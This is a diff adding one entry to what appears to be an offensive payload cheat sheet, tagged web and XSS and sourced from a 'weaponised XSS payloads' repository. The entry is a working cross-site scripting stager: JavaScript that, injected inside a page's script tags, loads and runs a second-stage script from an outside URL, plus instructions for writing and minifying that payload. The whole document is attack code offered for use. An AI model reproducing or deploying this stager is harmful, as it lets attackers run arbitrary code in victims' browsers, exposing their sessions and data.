@@ -1,0 +1,27 @@
+title = "Injecting External JS in Restricted HTML"
+description = "Staging external JS code without injecting HTML code"
+tags = ["web", "xss"]
+source = ["https://github.com/hakluke/weaponised-XSS-payloads/blob/master/staged-xss.js"]
+
+[[data]]
+description = "In the event that your payload is stuck inside <script> tags and you want to load an external JS, you can inject this snippet to stage a more complex payload."
+language = "javascript"
+command = """/*
+The external JS payload needs to be inside a function called "a" like this:
+
+function a(){
+  // payload here
+}
+
+It's a good idea to minify the code below after modifying it.
+
+*/
+
+var c=function(){
+    a() // a() is defined in the script downloaded by the payload
+};
+var s=document.createElement('script');
+s.src='//bit.ly/example';
+s.onreadystatechange=c;
+document.body.appendChild(s)
+"""
